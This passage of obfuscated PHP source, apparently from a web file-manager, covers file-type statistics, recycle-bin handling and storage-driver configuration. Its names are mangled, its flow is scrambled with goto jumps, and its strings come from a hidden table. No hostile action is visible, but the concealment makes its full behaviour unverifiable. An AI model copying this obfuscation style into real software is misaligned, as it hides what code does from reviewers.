{ return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($eá¿÷ßƒ¦ê) { return $this->fileTypeProfile($eá¿÷ßƒ¦ê, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C½¶éñíÉå) { return $this->fileTypeProfile($C½¶éñíÉå, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C¿‚…•éğ, $bĞ†®‡Ç ) { goto bÔæ¦¦®èÏ; AÁÊ“Äİ×¥: foreach ($eØó‹ä• as $EÁœ¹Ì¾Û‡ => $aÕ§ÜëÂŞÊ) { $CñåŒç†®[$aÉŠÎÏĞ­ô[381]] = $this->fileTypeWhere($EÁœ¹Ì¾Û‡); $b¯Œ‘ÀñË†[$EÁœ¹Ì¾Û‡] = array($aÉŠÎÏĞ­ô[2398] => $aÕ§ÜëÂŞÊ[$aÉŠÎÏĞ­ô[38]], $aÉŠÎÏĞ­ô[2399] => $this->where($CñåŒç†®)->count(), $aÉŠÎÏĞ­ô[531] => $this->where($CñåŒç†®)->sum($aÉŠÎÏĞ­ô[87])); } Cache::set($DÙ´ïö¢ª„, $b¯Œ‘ÀñË†, 1200); return $b¯Œ‘ÀñË†; goto f±ÔîÍåÒÂ; CÑê”œ÷Œ: if ($dì¤ºïŒ°¶) { return $dì¤ºïŒ°¶; } $CñåŒç†® = array($aÉŠÎÏĞ­ô[529] => 0); if ($C¿‚…•éğ != !1) { $CñåŒç†®[$aÉŠÎÏĞ­ô[467]] = $C¿‚…•éğ; $CñåŒç†®[$aÉŠÎÏĞ­ô[380]] = $bĞ†®‡Ç ; } goto aºñàŒ¥Ğõ; aºñàŒ¥Ğõ: $b¯Œ‘ÀñË† = array(); $b¯Œ‘ÀñË†[$aÉŠÎÏĞ­ô[2397]] = array($aÉŠÎÏĞ­ô[2398] => LNG($aÉŠÎÏĞ­ô[2397]), $aÉŠÎÏĞ­ô[2399] => $this->where($CñåŒç†®)->count(), $aÉŠÎÏĞ­ô[531] => $this->where($CñåŒç†®)->sum($aÉŠÎÏĞ­ô[87])); $eØó‹ä• = KodIO::fileTypeList(); goto AÁÊ“Äİ×¥; bÔæ¦¦®èÏ: $aÉŠÎÏĞ­ô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÙ´ïö¢ª„ = $aÉŠÎÏĞ­ô[2396] . $C¿‚…•éğ . $aÉŠÎÏĞ­ô[80] . $bĞ†®‡Ç ; $dì¤ºïŒ°¶ = Cache::get($DÙ´ïö¢ª„); goto CÑê”œ÷Œ; f±ÔîÍåÒÂ: } public function fileNameExist($B–ğĞ•Ê«Õ, $Aœ¡ ›êìÌ) { $dºÊÆîòµŞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CóáñßÍ– = $this->childList($B–ğĞ•Ê«Õ); foreach ($CóáñßÍ– as $E¥È—†øª) { if ($E¥È—†øª[$dºÊÆîòµŞ[38]] == $Aœ¡ ›êìÌ) { return $E¥È—†øª[$dºÊÆîòµŞ[378]]; } if (strtolower($E¥È—†øª[$dºÊÆîòµŞ[38]]) == strtolower($Aœ¡ ›êìÌ)) { return $E¥È—†øª[$dºÊÆîòµŞ[378]]; } } return !1; } public function childList($AŞ²¯ˆÔÁ) { goto A“°šÃ”ïš; A“°šÃ”ïš: $e¯Õ”¸¸ŒÄ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÇê·Ø†äì = $e¯Õ”¸¸ŒÄ[2378] . $AŞ²¯ˆÔÁ; if (isset(self::$cacheChildList[$EÇê·Ø†äì])) { return self::$cacheChildList[$EÇê·Ø†äì]; } goto Aõš²½¢•É; eìŒÍõßåÖ: self::$cacheChildList[$EÇê·Ø†äì] = $aõœ‹å˜óß; foreach ($aõœ‹å˜óß as $dìòĞÔ§İŒ) { $EÇê·Ø†äì = $e¯Õ”¸¸ŒÄ[419] . $dìòĞÔ§İŒ[$e¯Õ”¸¸ŒÄ[378]]; self::$cacheSourceInfo[$EÇê·Ø†äì] = $dìòĞÔ§İŒ; } return $aõœ‹å˜óß; goto aï‚ëÅ•Ï¯; Aõš²½¢•É: $A ÊùšŸ = array($e¯Õ”¸¸ŒÄ[472] => intval($AŞ²¯ˆÔÁ), $e¯Õ”¸¸ŒÄ[406] => 0); $aõœ‹å˜óß = $this->where($A ÊùšŸ)->select(); $aõœ‹å˜óß = $aõœ‹å˜óß ? $aõœ‹å˜óß : array(); goto eìŒÍõßåÖ; aï‚ëÅ•Ï¯: } public function fileNameAuto($e²öˆ±‡Ş, $E³‹‰¼í‹Û, $EÑ²šËİçâ = REPEAT_RENAME, $f·ÏçÙÕÏ… = false) { $eÆ›õ¢œº =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÖ÷‚É¸ëô = $this->childList($e²öˆ±‡Ş); $dñÂÕŞàİï = array_to_keyvalue($EÖ÷‚É¸ëô, $eÆ›õ¢œº[43], $eÆ›õ¢œº[38]); return $this->fileNameAutoGet($dñÂÕŞàİï, $E³‹‰¼í‹Û, $EÑ²šËİçâ, $f·ÏçÙÕÏ…); } public function fileNameAutoGet($fÊ«åŸˆ¿§, $cëÖ÷ØÒ, $bœ…Ÿ‡¢¡¶, $e£¨³Å†‹) { $C°ƒ•™¢Š¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($bœ…Ÿ‡¢¡¶ == REPEAT_REPLACE || !$fÊ«åŸˆ¿§ || !in_array_not_case($cëÖ÷ØÒ, $fÊ«åŸˆ¿§) || $e£¨³Å†‹ && $bœ…Ÿ‡¢¡¶ != REPEAT_RENAME_FOLDER) { return $cëÖ÷ØÒ; } if ($bœ…Ÿ‡¢¡¶ == REPEAT_SKIP) { return !1; } $døèµ¬÷¿˜ = $C°ƒ•™¢Š¶[101] . get_path_ext($cëÖ÷ØÒ); $døèµ¬÷¿˜ = $døèµ¬÷¿˜ == $C°ƒ•™¢Š¶[101] || $e£¨³Å†‹ ? $C°ƒ•™¢Š¶[43] : $døèµ¬÷¿˜; for ($d»§˜•Ö´Ë = 1; $d»§˜•Ö´Ë <= count($fÊ«åŸˆ¿§) + 1; $d»§˜•Ö´Ë++) { $FÆ¨áªÛ = substr($cëÖ÷ØÒ, 0, strlen($cëÖ÷ØÒ) - strlen($døèµ¬÷¿˜)); $D®©äŠŠº = $FÆ¨áªÛ . "\50{$d»§˜•Ö´Ë}\51{$døèµ¬÷¿˜}"; if (!in_array_not_case($D®©äŠŠº, $fÊ«åŸˆ¿§)) { return $D®©äŠŠº; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\x63\145\x5f\x72\x65\x63\171\143\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\124\x69\x6d\x65", "\164\x69\155\145", "\x69\156\163\x65\162\164", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($cº³•¿Ï×» = false) { $bõ›Ù’‰¢Í =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cº³•¿Ï×» = $cº³•¿Ï×» ? $cº³•¿Ï×» : USER_ID; $bãà…Âƒ¸ = $this->where(array($bõ›Ù’‰¢Í[1434] => $cº³•¿Ï×»))->select(); return array_to_keyvalue($bãà…Âƒ¸, $bõ›Ù’‰¢Í[43], $bõ›Ù’‰¢Í[378]); } public function moveToRecycle($f­ù²ØóÍ—) { goto fŠ ÃàÕä®; fÔ¶«¬¡Ç·: $this->recycleMove($f­ù²ØóÍ—, 1); if ($F­Üˆ´Ñæ[$fº•‡À‰ƒÅ[379]] == $fº•‡À‰ƒÅ[93]) { $f²öß„œ = array($fº•‡À‰ƒÅ[536] => array($fº•‡À‰ƒÅ[494], $F­Üˆ´Ñæ[$fº•‡À‰ƒÅ[470]] . $f­ù²ØóÍ— . $fº•‡À‰ƒÅ[495])); $aÈ½–±™­‹->where($f²öß„œ)->setField($fº•‡À‰ƒÅ[406], 1); } goto A´„®­ôÓè; fŠ ÃàÕä®: $fº•‡À‰ƒÅ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÈ½–±™­‹ = Model($fº•‡À‰ƒÅ[1124]); $F­Üˆ´Ñæ = $aÈ½–±™­‹->sourceInfo($f­ù²ØóÍ—); goto dÅ•×‰º»ä; dÅ•×‰º»ä: if (!$F­Üˆ´Ñæ || $F­Üˆ´Ñæ[$fº•‡À‰ƒÅ[406]] == $fº•‡À‰ƒÅ[93]) { return; } $BŠŠ¯Î’¹‡ = array($fº•‡À‰ƒÅ[392] => $f­ù²ØóÍ—, $fº•‡À‰ƒÅ[1434] => USER_ID, $fº•‡À‰ƒÅ[532] => $F­Üˆ´Ñæ[$fº•‡À‰ƒÅ[380]], $fº•‡À‰ƒÅ[533] => $F­Üˆ´Ñæ[$fº•‡À‰ƒÅ[467]], $fº•‡À‰ƒÅ[536] => $F­Üˆ´Ñæ[$fº•‡À‰ƒÅ[470]]); $this->add($BŠŠ¯Î’¹‡); goto fÔ¶«¬¡Ç·; A´„®­ôÓè: } public function clear() { $this->remove(!1); } public function remove($Eì›ƒîòœ› = false) { goto C¡Ò‘ñö; cÍİË«Ö…: $Eì›ƒîòœ› = $Eì›ƒîòœ› === !1 ? !1 : $Eì›ƒîòœ›; $cŠÒ¶Ÿ¼” = array(); foreach ($dÛ–¦Àùé² as $FÍ¦»™Œ¥å) { if ($Eì›ƒîòœ› != !1 && !in_array($FÍ¦»™Œ¥å, $Eì›ƒîòœ›)) { continue; } $Bˆ¥ñšŸä = $E² °¦¨ìÉ->sourceInfo($FÍ¦»™Œ¥å); $E² °¦¨ìÉ->remove($FÍ¦»™Œ¥å, !1); $BŠõ’•ä = $Bˆ¥ñšŸä[$b­ßÒ…•Ç[380]] . $b­ßÒ…•Ç[80] . $Bˆ¥ñšŸä[$b­ßÒ…•Ç[467]]; $cŠÒ¶Ÿ¼”[$BŠõ’•ä] = array($b­ßÒ…•Ç[532] => $Bˆ¥ñšŸä[$b­ßÒ…•Ç[380]], $b­ßÒ…•Ç[467] => $Bˆ¥ñšŸä[$b­ßÒ…•Ç[467]]); $this->where(array($b­ßÒ…•Ç[378] => $FÍ¦»™Œ¥å))->delete(); } goto a‘ñæ¦´¤; C¡Ò‘ñö: $b­ßÒ…•Ç =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E² °¦¨ìÉ = Model($b­ßÒ…•Ç[1124]); $dÛ–¦Àùé² = $this->listData(); goto cÍİË«Ö…; a‘ñæ¦´¤: foreach ($cŠÒ¶Ÿ¼” as $Bœ¶»ì‘Ÿ) { $E² °¦¨ìÉ->targetSpaceUpdate($Bœ¶»ì‘Ÿ[$b­ßÒ…•Ç[380]], $Bœ¶»ì‘Ÿ[$b­ßÒ…•Ç[467]]); } goto f»‡¹‡¿°; f»‡¹‡¿°: } public function restore($Cƒ“Ó¹š¥í = false) { goto C³Â­ŠŸÃ; C³Â­ŠŸÃ: $DÊ„Ãèİš¬ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c–øˆõé×‚ = Model($DÊ„Ãèİš¬[1124]); $fÑŸ²Êğ¶ˆ = $this->listData(); goto cŒ‡ó•±°‡; eÒößÊ—ã½: foreach ($fÑŸ²Êğ¶ˆ as $FÙ¼ğÈ‘±£) { goto BôŸƒ¯•¥‘; BôŸƒ¯•¥‘: if ($Cƒ“Ó¹š¥í != !1 && !in_array($FÙ¼ğÈ‘±£, $Cƒ“Ó¹š¥í)) { continue; } $Eß ‚°·˜Ì = $c–øˆõé×‚->sourceInfo($FÙ¼ğÈ‘±£); $f›œ¥´¤˜½ = $c–øˆõé×‚->sourceInfo($Eß ‚°·˜Ì[$DÊ„Ãèİš¬[472]]); goto fÅêº³Î‡ù; fÅêº³Î‡ù: if ($f›œ¥´¤˜½[$DÊ„Ãèİš¬[406]] == $DÊ„Ãèİš¬[93]) { continue; } $c–øˆõé×‚->lockMoveStart($FÙ¼ğÈ‘±£); $this->recycleMove($FÙ¼ğÈ‘±£, 0); goto c«ó‚È…ˆÜ; DÙ½¤’‡ê‚: $AÜÇÜ¹¶×ì[] = $Eß ‚°·˜Ì[$DÊ„Ãèİš¬[472]]; if ($Eß ‚°·˜Ì[$DÊ„Ãèİš¬[379]] == $DÊ„Ãèİš¬[93]) { $AÜÇÜ¹¶×ì[] = $FÙ¼ğÈ‘±£; } $c–øˆõé×‚->lockMoveEnd($FÙ¼ğÈ‘±£); goto Eº“‘»³”; c«ó‚È…ˆÜ: if ($Eß ‚°·˜Ì[$DÊ„Ãèİš¬[379]] == $DÊ„Ãèİš¬[93]) { $eº¤ñƒ¨©ñ = array($DÊ„Ãèİš¬[536] => array($DÊ„Ãèİš¬[494], $Eß ‚°·˜Ì[$DÊ„Ãèİš¬[470]] . $FÙ¼ğÈ‘±£ . $DÊ„Ãèİš¬[495])); $c–øˆõé×‚->where($eº¤ñƒ¨©ñ)->setField($DÊ„Ãèİš¬[406], 0); $this->restoreFolderChildren($FÙ¼ğÈ‘±£, $fÑŸ²Êğ¶ˆ); } $this->where(array($DÊ„Ãèİš¬[378] => $FÙ¼ğÈ‘±£))->delete(); $c–øˆõé×‚->folderSizeReset($Eß ‚°·˜Ì[$DÊ„Ãèİš¬[472]]); goto DÙ½¤’‡ê‚; Eº“‘»³”: } $c–øˆõé×‚->updateModifyTime($AÜÇÜ¹¶×ì); goto Bæğ°†¡È; cŒ‡ó•±°‡: $Cƒ“Ó¹š¥í = $Cƒ“Ó¹š¥í == !1 ? !1 : $Cƒ“Ó¹š¥í; if (!$fÑŸ²Êğ¶ˆ) { return !0; } $AÜÇÜ¹¶×ì = array(); goto eÒößÊ—ã½; Bæğ°†¡È: } private function restoreFolderChildren($C¶Â®¼â¼«, $C²…‹Œî‘Ó) { goto c‚Ö™”ñà; dº•ÁñöãŞ: $FãİÙ…[$eÛ²¶¦›‘å[378]][1] = array_unique($FãİÙ…[$eÛ²¶¦›‘å[378]][1]); $FãİÙ…[$eÛ²¶¦›‘å[920]] = $eÛ²¶¦›‘å[2199]; $bäÄ¥ô„ùµ->where($FãİÙ…)->setField($eÛ²¶¦›‘å[406], 1); goto A®•‡ê¦ˆ‰; fœÍÜß§Ô¹: foreach ($C²…‹Œî‘Ó as $cô•ƒ«º‚¤) { if ($cô•ƒ«º‚¤ == $C¶Â®¼â¼«) { continue; } if (!$bäÄ¥ô„ùµ->isParentOf($C¶Â®¼â¼«, $cô•ƒ«º‚¤)) { continue; } $d³â†“Ş¢Â = $bäÄ¥ô„ùµ->sourceInfo($cô•ƒ«º‚¤); if ($d³â†“Ş¢Â[$eÛ²¶¦›‘å[379]] == $eÛ²¶¦›‘å[93]) { $FãİÙ…[] = array($eÛ²¶¦›‘å[536] => array($eÛ²¶¦›‘å[494], $d³â†“Ş¢Â[$eÛ²¶¦›‘å[470]] . $cô•ƒ«º‚¤ . $eÛ²¶¦›‘å[495])); } else { $FãİÙ…[$eÛ²¶¦›‘å[378]][1][] = $cô•ƒ«º‚¤; } } if (!$FãİÙ…[$eÛ²¶¦›‘å[378]][1]) { unset($FãİÙ…[$eÛ²¶¦›‘å[378]]); } if (!$FãİÙ…) { return; } goto dº•ÁñöãŞ; c‚Ö™”ñà: $eÛ²¶¦›‘å =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bäÄ¥ô„ùµ = Model($eÛ²¶¦›‘å[1124]); $FãİÙ… = array($eÛ²¶¦›‘å[378] => array($eÛ²¶¦›‘å[17], array())); goto fœÍÜß§Ô¹; A®•‡ê¦ˆ‰: } private function recycleMove($A‰ÃÈ¥‹, $e¢æÀ¥È… = 1) { $E‡…½Á†÷õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d•ÑĞ™áÅµ = Model($E‡…½Á†÷õ[1124]); $F«ÈìÍéà = Model($E‡…½Á†÷õ[2400]); $e„ñ‡íØæ = array($E‡…½Á†÷õ[378] => $A‰ÃÈ¥‹); if ($e¢æÀ¥È…) { $d•ÑĞ™áÅµ->where($e„ñ‡íØæ)->setField($E‡…½Á†÷õ[406], 1); $F«ÈìÍéà->eventRecycle($A‰ÃÈ¥‹, $E‡…½Á†÷õ[2401]); } else { $fÜÀé‚‡Û£ = $d•ÑĞ™áÅµ->where($e„ñ‡íØæ)->find(); $Bóá­£·Îî = $fÜÀé‚‡Û£[$E‡…½Á†÷õ[379]] == $E‡…½Á†÷õ[93]; $B÷¤ˆŞñ³‹ = $d•ÑĞ™áÅµ->fileNameAuto($fÜÀé‚‡Û£[$E‡…½Á†÷õ[472]], $fÜÀé‚‡Û£[$E‡…½Á†÷õ[38]], REPEAT_RENAME_FOLDER, $Bóá­£·Îî); if ($B÷¤ˆŞñ³‹ != $fÜÀé‚‡Û£[$E‡…½Á†÷õ[38]]) { $d•ÑĞ™áÅµ->rename($A‰ÃÈ¥‹, $B÷¤ˆŞñ³‹); } $d•ÑĞ™áÅµ->where($e„ñ‡íØæ)->setField($E‡…½Á†÷õ[406], 0); $F«ÈìÍéà->eventRecycle($A‰ÃÈ¥‹, $E‡…½Á†÷õ[2402]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x73\x74\x6f\x72\x61\147\x65\114\x69\163\164"; public $field = array("\156\x61\x6d\145", "\163\x69\172\x65\x4d\141\170", "\x73\x79\163\164\145\155", "\144\x65\146\141\165\x6c\x74", "\144\x72\x69\x76\x65\162", "\x63\x6f\x6e\146\151\147"); public function listData($bù«é±Ø”ã = false, $cîĞîÖêôî = "\155\x6f\144\x69\x66\x79\x54\x69\x6d\x65", $EğÍÆœ”£è = false) { goto Dƒã–Ü; Dƒã–Ü: $Fè½¼‹©÷Ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C‡ùğºÛ¶Ï = parent::listData($bù«é±Ø”ã, $cîĞîÖêôî, $EğÍÆœ”£è); if ($bù«é±Ø”ã) { return $C‡ùğºÛ¶Ï; } goto CÑ†¶‰¤ß¤; CÑ†¶‰¤ß¤: foreach ($C‡ùğºÛ¶Ï as $C‹‘±†Ş‘Å => $d³„•¡å±ö) { unset($C‡ùğºÛ¶Ï[$C‹‘±†Ş‘Å][$Fè½¼‹©÷Ë[16]]); $C‡ùğºÛ¶Ï[$C‹‘±†Ş‘Å][$Fè½¼‹©÷Ë[2100]] = 0; } $d¿Ãâ„Ì» = array_to_keyvalue($C‡ùğºÛ¶Ï, $Fè½¼‹©÷Ë[43], $Fè½¼‹©÷Ë[376]); $this->_listAppendSize($C‡ùğºÛ¶Ï, $d¿Ãâ„Ì»); goto bª’Äß¶¬ï; bª’Äß¶¬ï: return $C‡ùğºÛ¶Ï; goto c‰²½Âôå; c‰²½Âôå: } public function _listAppendSize(&$BŠ»ÄïËˆ, $E‘ôÊ‘—œâ) { $e‰Ü±ñåÄ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$E‘ôÊ‘—œâ) { return; } $b–ó®§ÖŠ = $e‰Ü±ñåÄ[2403] . implode($e‰Ü±ñåÄ[57], $E‘ôÊ‘—œâ) . $e‰Ü±ñåÄ[2404]; $eİ†ßÂœÔ‚ = Model($e‰Ü±ñåÄ[727])->query($b–ó®§ÖŠ); $eİ†ßÂœÔ‚ = array_to_keyvalue($eİ†ßÂœÔ‚, $e‰Ü±ñåÄ[376], $e‰Ü±ñåÄ[87]); foreach ($BŠ»ÄïËˆ as $Cîè‰Ì­ß => $aÖÉ¦ƒ½öÉ) { $BŠ»ÄïËˆ[$Cîè‰Ì­ß][$e‰Ü±ñåÄ[2100]] = isset($eİ†ßÂœÔ‚[$aÖÉ¦ƒ½öÉ[$e‰Ü±ñåÄ[376]]]) ? $eİ†ßÂœÔ‚[$aÖÉ¦ƒ½öÉ[$e‰Ü±ñåÄ[376]]] : 0; } } public function getConfig($aù¢òÆÈĞ«) { $dç¤£äªÏ = parent::listData($aù¢òÆÈĞ«); return json_decode($dç¤£äªÏ[$_SERVER[çŞáÓæÚô‚Ô‡][16]], !0); } public function update($A¶¨Èƒİ, $cØé• çÀ) { goto e°ˆ†ÆÕ‘†; a±›õƒ—‡£: $EàáàÌ¾¡ = parent::update($A¶¨Èƒİ, $cØé• çÀ); if ($EàáàÌ¾¡ && $cØé• çÀ[$DÜ¯æİì†“[44]]) { foreach ($F³Ã¡öóµô as $Cö‡ÌÌÒ±ô) { if ($Cö‡ÌÌÒ±ô[$DÜ¯æİì†“[44]] && $Cö‡ÌÌÒ±ô[$DÜ¯æİì†“[376]] != $A¶¨Èƒİ) { parent::update($Cö‡ÌÌÒ±ô[$DÜ¯æİì†“[376]], array($DÜ¯æİì†“[44] => 0)); } } } return $EàáàÌ¾¡; goto Bø±‚ù½İô; BßÕŞÙÛŠ¼: if (isset($F³Ã¡öóµô[$c»ğ›Ù·ÏØ]) && $F³Ã¡öóµô[$c»ğ›Ù·ÏØ][$DÜ¯æİì†“[376]] != $A¶¨Èƒİ) { return !1; } if (isset($cØé• çÀ[$DÜ¯æİì†“[2405]]) && $cØé• çÀ[$DÜ¯æİì†“[2405]] == $DÜ¯æİì†“[93]) { $this->checkConfig($cØé• çÀ); } unset($cØé• çÀ[$DÜ¯æİì†“[2405]]); goto a±›õƒ—‡£; e°ˆ†ÆÕ‘†: $DÜ¯æİì†“ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c»ğ›Ù·ÏØ = $cØé• çÀ[$DÜ¯æİì†“[38]]; $F³Ã¡öóµô = array_to_keyvalue(parent::listData(), $DÜ¯æİì†“[38]); goto BßÕŞÙÛŠ¼; Bø±‚ù½İô: } public function add($B©÷ùÚÚÆ¬) { goto cÀÉ’å°‡Å; eÀÉ»ÍÎÍ: return $Dí¨—ä¥œâ; goto F¸Ö†–Ã…Ê; Bºñ·ùÒÔÈ: $this->checkConfig($B©÷ùÚÚÆ¬); $Dí¨—ä¥œâ = parent::insert($B©÷ùÚÚÆ¬); if ($Dí¨—ä¥œâ && $B©÷ùÚÚÆ¬[$F„“ Ÿ¬ˆ•[44]]) { foreach ($eõ¶›Ê¾ºÙ as $FÓ‹ÁÄùÛ±) { if ($FÓ‹ÁÄùÛ±[$F„“ Ÿ¬ˆ•[44]]) { parent::update($FÓ‹ÁÄùÛ±[$F„“ Ÿ¬ˆ•[376]], array($F„“ Ÿ¬ˆ•[44] => 0)); } } } goto eÀÉ»ÍÎÍ; cÀÉ’å°‡Å: $F„“ Ÿ¬ˆ• =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eõ¶›Ê¾ºÙ = array_to_keyvalue(parent::listData(), $F„“ Ÿ¬ˆ•[38]); if (isset($eõ¶›Ê¾ºÙ[$B©÷ùÚÚÆ¬[$F„“ Ÿ¬ˆ•[38]]])) { return !1; } goto Bºñ·ùÒÔÈ; F¸Ö†–Ã…Ê: } public function checkConfig(&$aÕŞçºÖ·) { goto b¢¿èÍí…™; AÈ¸‰­øŠ‡: if (in_array($bÑéí‘”’•, $b›‡ÎŒ™ª->objectDriver)) { if (!$b›‡ÎŒ™ª->isBucketCors() && !$b›‡ÎŒ™ª->setBucketCors()) { $Câ¬¼½†Ê‡ = LNG($bè¹™¼™™[2410]); $Câ¬¼½†Ê‡ .= $bè¹™¼™™[2411] . LNG($bè¹™¼™™[2412]); show_json($Câ¬¼½†Ê‡, !1); } } $DãŠêÓº¨ = rtrim($CÅÅ¦âŸÈ¢[$bè¹™¼™™[1031]], $bè¹™¼™™[18]) . $bè¹™¼™™[18]; $D‚Š°¢ÔÙ = $b›‡ÎŒ™ª->getPath($DãŠêÓº¨ . $bè¹™¼™™[1995]); goto a²äæÎİâ¶; EññÖ Š¬°: $aÕŞçºÖ·[$bè¹™¼™™[100]] = $EÖÏñ»ÌéÎ; return !0; goto e¬Ü÷ÉË¯; a²äæÎİâ¶: if (!$b›‡ÎŒ™ª->mkfile($D‚Š°¢ÔÙ)) { show_json(LNG($bè¹™¼™™[2410]), !1); } $CÅÅ¦âŸÈ¢[$bè¹™¼™™[1031]] = $DãŠêÓº¨; $aÕŞçºÖ·[$bè¹™¼™™[16]] = json_encode($CÅÅ¦âŸÈ¢); goto EññÖ Š¬°; b¡å¿åêÆ: foreach ($CÅÅ¦âŸÈ¢ as $aùŞîîø¤Ç => $c¿â‰ö­®) { $CÅÅ¦âŸÈ¢[$aùŞîîø¤Ç] = trim($c¿â‰ö­®); } $CÅÅ¦âŸÈ¢[$bè¹™¼™™[2406]] = rand_string(6); $EÖÏñ»ÌéÎ = $this->driverType($bÑéí‘”’•); goto D»”ƒ¾Š÷º; b¢¿èÍí…™: $bè¹™¼™™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÑéí‘”’• = strtolower($aÕŞçºÖ·[$bè¹™¼™™[100]]); $CÅÅ¦âŸÈ¢ = json_decode($aÕŞçºÖ·[$bè¹™¼™™[16]], !0); goto b¡å¿åêÆ; D»”ƒ¾Š÷º: $e¾ÎîÇ¥– = $bè¹™¼™™[81] . $EÖÏñ»ÌéÎ; if (!$EÖÏñ»ÌéÎ || !class_exists($e¾ÎîÇ¥–)) { write_log(array($bè¹™¼™™[2407], $aÕŞçºÖ·, get_caller_info()), $bè¹™¼™™[2408]); show_json($bè¹™¼™™[2409], !1, $aÕŞçºÖ·); } $b›‡ÎŒ™ª = new $e¾ÎîÇ¥–($CÅÅ¦âŸÈ¢); goto AÈ¸‰­øŠ‡; e¬Ü÷ÉË¯: } private function driverType($F±é°„šô¸) { $eõóùæĞòÉ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cù»î–›³” = array($eõóùæĞòÉ[112] => $eõóùæĞòÉ[2413], $eõóùæĞòÉ[68] => $eõóùæĞòÉ[2414], $eõóùæĞòÉ[74] => $eõóùæĞòÉ[2415]); if (isset($Cù»î–›³”[$F±é°„šô¸])) { return $Cù»î–›³”[$F±é°„šô¸]; } return strtoupper($F±é°„šô¸); } public function driverListSystem() { $AÚÚêåÇ–† =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¤‘ÖìŒ = parent::listData(); $cñ©™¬åÓæ = array(); foreach ($a¤‘ÖìŒ as $eÈ˜ğÇ®) { unset($eÈ˜ğÇ®[$AÚÚêåÇ–†[197]], $eÈ˜ğÇ®[$AÚÚêåÇ–†[117]]); $eÈ˜ğÇ®[$AÚÚêåÇ–†[16]] = json_decode($eÈ˜ğÇ®[$AÚÚêåÇ–†[16]], !0); $cñ©™¬åÓæ[] = $eÈ˜ğÇ®; } return $cñ©™¬åÓæ; } public function defaultDriver() { $bèÉ‘Şìñ¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÀéÖåí—ø = parent::listData(); $cÕÅ™ñ× = array_filter_by_field($EÀéÖåí—ø, $bèÉ‘Şìñ¥[44], 1); $cÕÅ™ñ× = $cÕÅ™ñ×[0]; if ($cÕÅ™ñ×) { $cÕÅ™ñ×[$bèÉ‘Şìñ¥[16]] = json_decode($cÕÅ™ñ×[$bèÉ‘Şìñ¥[16]], !0); } return $cÕÅ™ñ×; } public function driverInfo($cèµ¬Ã¯óï) { $dƒ“ÖÔÄÜé =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eåŒë‹³Ÿ = array_to_keyvalue(parent::listData(), $dƒ“ÖÔÄÜé[376]); if (!isset($eåŒë‹³Ÿ[$cèµ¬Ã¯óï])) { return !1; } $A°ÈÌÙò°ß = $eåŒë‹³Ÿ[$cèµ¬Ã¯óï]; $A°ÈÌÙò°ß[$dƒ“ÖÔÄÜé[16]] = json_decode($A°ÈÌÙò°ß[$dƒ“ÖÔÄÜé[16]], !0); return $A°ÈÌÙò°ß; } public function remove($FÆĞÀ×áòù) { $this->removeShareItems($FÆĞÀ×áòù); return parent::remove($FÆĞÀ×áòù); } public function removeWithFile($EÉ¾ÛÕç× ) { goto dã¸ñ¯¿Ç; cŠÍ —ƒ: if (!$FÑºª¥İ‚‚) { $FèéÛä¯Á->stop($a¢ ËŒÇ‡—); return !1; } $FèéÛä¯Á->end(); $this->remove($EÉ¾ÛÕç× ); goto A¤Šº—´š; eî¹ÉÇÚ¥: $FèéÛä¯Á->task[$Aø‡‚“ ‹[707]] = (double) $A›’’ÍÑ¿¿; $BÖÇŸÒÅ¸› = KodIO::defaultDriver(); $FˆïÙÙÂ‘‡ = $BÖÇŸÒÅ¸›[$Aø‡‚“ ‹[376]]; goto AäÍ±ÚÜÂë; dã¸ñ¯¿Ç: $Aø‡‚“ ‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a”âÍˆ = array($Aø‡‚“ ‹[752] => $EÉ¾ÛÕç× ); $e¥šÑ¢ã¸ = Model($Aø‡‚“ ‹[431])->where($a”âÍˆ)->count(); goto b£ĞÃÇâ»í; b£ĞÃÇâ»í: $A›’’ÍÑ¿¿ = Model($Aø‡‚“ ‹[431])->where($a”âÍˆ)->sum($Aø‡‚“ ‹[87]); $a¢ ËŒÇ‡— = $Aø‡‚“ ‹[2416] . $EÉ¾ÛÕç× ; $FèéÛä¯Á = new TaskFileTransfer($a¢ ËŒÇ‡—, $Aø‡‚“ ‹[2408], $e¥šÑ¢ã¸, LNG($Aø‡‚“ ‹[2417]) . "\x28{$EÉ¾ÛÕç× }\x29"); goto eî¹ÉÇÚ¥; c•‚Í½Çé: $fÀæ—¥éÚ = Model($Aø‡‚“ ‹[177])->where($a”âÍˆ)->field($Aø‡‚“ ‹[2418])->select(); foreach ($fÀæ—¥éÚ as $FŠ‹ººå…) { goto aË¬·ö©¡Õ; aË¬·ö©¡Õ: $e‹†ËŞù÷ = $FŠ‹ººå…[$Aø‡‚“ ‹[85]]; $b÷Ò¨ß‰ = $eÙ´çõ©àß . str_replace("\173\151\157\72{$EÉ¾ÛÕç× }\175\x2f", $Aø‡‚“ ‹[43], $e‹†ËŞù÷); if (!IO::exist($e‹†ËŞù÷)) { $däÁ‚¹òÈ‘[] = $FŠ‹ººå…[$Aø‡‚“ ‹[428]]; 